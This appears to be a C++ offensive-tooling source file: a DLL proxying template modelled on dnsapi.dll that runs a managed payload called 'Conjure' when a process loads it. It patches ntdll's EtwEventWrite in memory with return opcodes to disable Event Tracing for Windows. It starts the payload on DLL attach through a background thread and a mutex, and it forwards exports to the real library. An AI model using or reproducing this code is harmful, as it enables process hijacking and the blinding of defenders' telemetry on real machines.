// DLL proxying template made from a dnsapi.dll proxy
// Runs the conjure managed DLL when called by a process
// Disables Event Tracing for Windows

#include "pch.h"
#include <windows.h>
#include <iostream>

//libraries to run C# dll
#include <metahost.h>
#pragma comment(lib, "mscoree.lib")

//declare mutex name. This is used to make sure only one instance of Conjure is running on machine
const wchar_t* MUTEX_NAME = L"CONJUREMUTEX";

int runManaged() {

    ICLRMetaHost* metaHost = NULL;
    ICLRRuntimeInfo* runtimeInfo = NULL;
    ICLRRuntimeHost* runtimeHost = NULL;

    if (CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (LPVOID*)&metaHost) == S_OK)
        if (metaHost->GetRuntime(L"v4.0.30319", IID_ICLRRuntimeInfo, (LPVOID*)&runtimeInfo) == S_OK)
            if (runtimeInfo->GetInterface(CLSID_CLRRuntimeHost, IID_ICLRRuntimeHost, (LPVOID*)&runtimeHost) == S_OK)
                if (runtimeHost->Start() == S_OK)
                {
                    DWORD pReturnValue;
                    runtimeHost->ExecuteInDefaultAppDomain(L"C:\\cs_pop_box_dll.dll", L"dllNamespace.dllClass", L"ShowMsg", L"It works!!", &pReturnValue);

                    runtimeInfo->Release();
                    metaHost->Release();
                    runtimeHost->Release();
                }

    return 0;
}

void disableETWx86() {
    //This is a basic version of disabling Event tracing
    //overwrites EtwEventWrite to return directly when called

    DWORD oldProt, oldOldProt;

    //DISABLE ETW
    // Get the EventWrite function
    void* eventWrite = GetProcAddress(LoadLibraryA("ntdll"), "EtwEventWrite");

    // Allow writing to page
    VirtualProtect(eventWrite, 4, PAGE_EXECUTE_READWRITE, &oldProt);

    // Patch with "ret 14" on x86
    memcpy(eventWrite, "\xc2\x14\x00\x00", 4);

    // Return memory to original protection
    VirtualProtect(eventWrite, 4, oldProt, &oldOldProt);
}

void disableETWx64() {

    DWORD oldProt, oldOldProt;

    //DISABLE ETW
    // Get the EventWrite function
    void* eventWrite = GetProcAddress(LoadLibraryA("ntdll"), "EtwEventWrite");

    // Allow writing to page
    VirtualProtect(eventWrite, 4, PAGE_EXECUTE_READWRITE, &oldProt);

    // Patch with "xor rax, rax; ret" on x64
    memcpy(eventWrite, "\x48\x33\xc0\xc3", 4);

    // Return memory to original protection
    VirtualProtect(eventWrite, 4, oldProt, &oldOldProt);
}

int Main() {

    static HANDLE nMutex = NULL;

    while (TRUE) {

        Sleep(5000);

        //try to create mutex
        nMutex = CreateMutexW(NULL, TRUE, MUTEX_NAME);

        ///if mutex already exists, close handle and repeat while loop
        if (nMutex == NULL || GetLastError() == ERROR_ALREADY_EXISTS) {
            CloseHandle(nMutex);
        }
        else {
            //Disable Event Tracing for Windows
            //uncomment the correct target architecture
            //disableETWx86();
            disableETWx64();

            //Create CLR hosting interface and call C# DLL
            runManaged();
            CloseHandle(nMutex);
        }
    }
    return 1;
}


BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    //declare hMutex so it can be used across switch statement
    static HANDLE hMutex = NULL;

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:

        //Start Main() in a new thread
        CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)Main, NULL, NULL, NULL);

        break;

    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:

        //Release Mutex before DLL detaches
        if (hMutex != NULL) {
            ReleaseMutex(hMutex);
            CloseHandle(hMutex);
            hMutex = NULL;
        }

        break;

    }

    return TRUE;
}

/*Insert export functions from getExports.py

ex:
#pragma comment(linker,"/export:DnsGetDomainName=C:\\Windows\\System32\\utilitycore.DnsGetDomainName,@1")
...
#pragma comment(linker,"/export:WriteDnsNrptRulesToRegistry=C:\\Windows\\System32\\utilitycore.WriteDnsNrptRulesToRegistry,@289")
*/